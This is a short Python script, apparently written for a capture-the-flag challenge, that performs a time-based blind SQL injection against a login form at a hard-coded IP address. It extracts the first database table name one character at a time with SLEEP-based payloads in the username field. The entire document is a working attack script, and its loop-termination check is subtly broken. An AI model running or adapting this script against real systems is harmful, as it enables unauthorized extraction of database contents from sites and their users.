import requests
import string
import time

url = "http://202.120.7.16:35132/"
charset = string.ascii_lowercase + string.digits + "_"
table_name = ""

for i in range(1, 20):  # 最多尝试20个字符
    for char in charset:
        payload = f"admin' OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),{i},1)='{char}',SLEEP(3),1) --"
        data = {"username": payload, "password": "dummy"}
        
        start_time = time.time()
        response = requests.post(url, data=data)
        end_time = time.time()
        
        if end_time - start_time > 2:  # 延迟超过2秒，说明条件成立
            table_name += char
            print(f"Found character {i}: {char}")
            break
    
    if not char:  # 没有找到匹配字符，结束循环
        break

print(f"第一个表名: {table_name}")